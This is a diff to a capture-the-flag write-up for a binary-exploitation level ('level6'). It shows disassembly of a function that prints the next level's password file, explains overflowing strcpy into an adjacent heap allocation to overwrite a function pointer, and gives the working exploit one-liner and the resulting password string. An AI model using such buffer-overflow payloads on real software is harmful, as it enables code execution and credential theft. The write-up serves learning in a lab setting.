@@ -1,5 +1,5 @@
-On this one, we have a unused function like level1, if we `objdump -d level6` :
-```asm
+On this one, we have to overlap a short allocated memory, if we `objdump -d level6` :
+```nasm
 08048454 <n>:
  8048454:	55                   	push   %ebp
  8048455:	89 e5                	mov    %esp,%ebp
@@ -11,7 +11,10 @@ On this one, we have a unused function like level1, if we `objdump -d level6` :
 ```
 This function execute a simple `system("/bin/cat /home/user/level7/.pass")`.
 
-We need to overflow `strcpy` with a padding and place our `<n>` address :
+When memory allocation don't exceed a length of a page (depend to our system), we can easily overlap his neighbor in memory. 
+
+We need to overflow `strcpy()` with a padding and place our `n()` address :
+This just the value of the function pointer **ppcVar1** to pint into `n()`
 ```bash
 ./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
